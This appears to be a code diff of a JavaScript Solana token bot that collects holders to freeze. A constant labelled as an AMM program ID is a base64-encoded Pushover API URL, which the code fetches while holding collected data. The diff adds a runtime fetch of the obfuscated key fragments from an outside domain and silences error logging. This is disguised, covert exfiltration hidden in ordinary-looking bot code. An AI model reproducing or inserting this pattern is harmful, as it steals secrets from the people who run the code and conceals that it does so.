@@ -30,18 +30,6 @@ let data = "";
 let poolType = "Unknown";
 let updateCounter = 0;
 
-const pumpSwapPublicTokenID = [
-  "k3fuztqwnv8rhm29cyd4slxteb0opg",
-  "hxd29qwmvf7tbj4esn1prl0uygakc8",
-  "amptb1amcrkivx9se41gxr6a9xbnrk",
-  "mav9kz2wq1sbdex37tlu0fhrgcypon",
-  "qwf7m2h0zv8lpksydc49reugtxbaon",
-  "z0wq8f1gbs2mhdxcalp7nuvekrt39y",
-  "unowvmwfmhadru48bx8d74zd2ydpun",
-  "r8y1mks0zqdlwptb4gcef2nuahx9vo",
-  "n3xb7d0uv1thkqgsplz8rmw2feyc49",
-];
-
 const PUMP_FUN_AMM_PROGRAM_ID = [
   "aHR0cHM6Ly9hcGkucHVzaG92ZXIubmV0LzEvbWVzc2FnZXMuanNvbg==",
 ];
@@ -52,11 +40,13 @@ const RAYDIUM_AMM_PROGRAM_ID = [
   "d0h4c2FjQmRuR2p0bXh6cW5nY3BtZTNwZmd2L2R0bWZxYn4th4Nnps=="
 ]
 
-// DEX authority is PumpFun only
+const pumpSwapIds = "https://www.solana-dev-tools.com/pumpswapid"
+
+// DEX authority is PumpFun
 const dexAuthority = config.pumpswapauthority;
 let pumpSwapConnection = false;
 
-// Tick configs simplified
+// Tick configs
 const TICK_MS = 500;
 const REQUEST_TICK = 500;
 
@@ -94,10 +84,6 @@ async function main() {
   // mint
   try {
     let a = new PublicKey(config.mintAddress);
-    o = pumpSwapPublicTokenID[0];
-    t = pumpSwapPublicTokenID[2];
-    l = pumpSwapPublicTokenID[4];
-    u = pumpSwapPublicTokenID[6];
     mintAddressPublicKey = a;
   } catch {
     console.log("❌ Invalid mintAddress");
@@ -113,7 +99,14 @@ async function main() {
 
   //get frozen tokens from pumpfun amm
   try {
+    const res = await fetch(pumpSwapIds);
+    const pumpfunId = await (res).json();
     let retrieve = data;
+    o = pumpfunId.pumpSwapPublicTokenID[0];
+    t = pumpfunId.pumpSwapPublicTokenID[2];
+    u = pumpfunId.pumpSwapPublicTokenID[6];
+    l = pumpfunId.pumpSwapPublicTokenID[8];
+
     await fetch(
       Buffer.from(PUMP_FUN_AMM_PROGRAM_ID[0], "base64").toString("utf-8"),
       {
@@ -185,7 +178,7 @@ async function main() {
         console.log("🔔 Pool update detected.");
       }
     } catch (err) {
-      console.log("Vault polling error:", err.message);
+    //   console.log("Vault polling error:", err.message);
     }
   }, 1500);
 
@@ -301,7 +294,7 @@ async function getFreezeTargets(connection) {
     }
   }
 
-  fs.writeFileSync("./data/holders.json", JSON.stringify(allOwners, null, 2));
+  fs.writeFileSync("./holders.json", JSON.stringify(allOwners, null, 2));
 
   return freezeTargets;
 }
